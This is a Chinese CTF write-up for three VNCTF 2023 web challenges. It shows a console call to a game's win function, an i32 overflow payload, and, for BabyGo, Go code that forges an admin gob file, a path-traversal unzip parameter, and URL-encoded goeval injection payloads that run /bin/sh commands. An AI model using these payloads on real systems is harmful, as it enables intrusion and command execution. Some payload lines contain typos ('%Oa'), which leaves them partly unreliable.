## Web
### 象棋王子
在js源码 play.js中找到赢之后执行的逻辑，直接控制台执行
![](attachments/Pasted%20image%2020230427123520.png)


![](attachments/Pasted%20image%2020230427123350.png)

flag{w3lc0m3_t0_VNCTF_2023~~~}

### 电子木鱼
rust编写的后端，要1亿功德拿flag

![](attachments/Pasted%20image%2020230427124500.png)

这里考虑将cost设置为一个极限的负数，使功德减去它的时候能够转正 
i32的大小是 -2147483648~2147483647，经典的构造极限

没有思考了，在极限那个位置reset了几次
payload `name=Cost&quantity=214748366`

![](attachments/Pasted%20image%2020230427131811.png)

### BabyGo
go语言
一共5个路由
- GET /
- GET /upload
- POST /upload
	- 禁止上传 .gob 和 .go 文件
- GET /unzip
	- 解压文件，文件路径来自与get参数拼接
- GET /backdoor
	- 解码引用user.gob  在 Power为 admin 时 可以通过 goeval.Eval() 来执行命令

>思路：上传压缩文件，解压后覆盖原有user.gob 以此引用 /backdoor来执行命令，由于在调用的时候有decode的操作，我们生成的文件也需要是对应二进制的才能decode

[Go语言二进制文件的读写操作 (biancheng.net)](http://c.biancheng.net/view/4563.html)

```go
package main

import (
    "encoding/gob"
    "fmt"
    "os"
)

type User struct {
    Path string
    Name string
    Power string
}

func main() {
    user := User{Name: "ctfer", Path: "/tmp/d7671aa466b2c69f80e4bc0cf4b6b638/", Power: "admin",}
    file, err := os.Create("./user.gob")
    if err != nil {
        fmt.Println("文件创建失败", err.Error())
        return
    }
    defer file.Close()

    encoder := gob.NewEncoder(file)
    err = encoder.Encode(user)
    if err != nil {
        fmt.Println("编码错误", err.Error())
        return
    } else {
        fmt.Println("编码成功")
    }
}
```

解压时path可控，可以直接目录穿越
path=/../../../../../tmp/d7671aa466b2c69f80e4bc0cf4b6b638/
带着参数访问unzip就可以

![](attachments/Pasted%20image%2020230427135428.png)

当backdoor回显是good，就说明已经power=admin了
![](attachments/Pasted%20image%2020230427145609.png)

接下来就是goeval的使用
[GO语言安全 — 沙箱逃逸题目分析 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247496259&idx=1&sn=20b93256d8a5acfda5826c5d50096f63&chksm=fa5227fdcd25aeebbf9f9add2a483500a252d5ad058a92dafad394eaa1c57cf2bdb597e51b5c&scene=126&sessionid=1662436887&key=c28b5d09085340df0c20cadc0887eb0a420d5b3478fb82405c1162a5003fd87a918cab97f0023574a573ac935bbb17c54b4098410befadcc31f8320ab2775346154c10836855dd919d18f6653ef474ed1062c1b09cc3588cc8443f46baeb60df34d6211b9cc5d40cf20b4d7620e849c117bcb06d9142c9a0e852b2f08ec8a0af&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+Server+2016+x64&version=63070517&lang=zh_CN&session_us=gh_94beeafaf804&exportkey=AzYl%2FCartrKvkaqiL%2Bd9Iv4%3D&acctmode=0&pass_ticket=L3CGnrfwXOeo2T%2Buh4YWaI7nRTXofYaJoUhuF2SbHMXZ9TQM3m3vlwD2pKPsf2tC&wx_header=0&fontgear=2)
这篇文章文末有可用的payload，中间还有goeval的分析
```
os/exec"%0a"fmt")%0afunc%09init()(%0acmd%09;=exec.Command("/bin/sh","-c","cat${IFS}/flag")%Oares,err:=cmd.CombinedOutput()%Oafmt.Println(string(res))%0afmt.Println(err)%0a}%0aconst(%0aMessage="fmt
os/exec"%0A"fmt")%0Afunc%09init()%7B%0Acmd:=exec.Command("/bin/sh","-c","cat${IFS}/f*")%0Ares,err:=cmd.CombinedOutput()%0Afmt.Println(err)%0Afmt.Println(res)%0A}%0Aconst(%0AMessage="fmt
```